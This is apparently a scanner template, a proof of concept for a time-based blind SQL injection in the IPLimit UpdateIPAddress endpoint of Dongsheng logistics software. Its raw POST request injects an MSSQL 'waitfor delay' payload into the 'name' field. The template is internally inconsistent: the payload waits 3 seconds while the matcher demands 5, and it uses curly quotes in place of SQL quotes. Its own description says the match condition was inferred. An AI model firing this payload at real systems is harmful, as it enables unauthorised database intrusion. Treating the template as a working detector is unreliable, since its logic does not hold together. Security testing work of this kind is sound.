id: poc-im78hmaf2a8ihive
info:
  name: 东胜物流软件 IPLimitController SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2026
http:
- raw:
  - 'POST /MvcShipping/IPLimit/UpdateIPAddress HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    name=’ waitfor delay’0:0:3’--'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
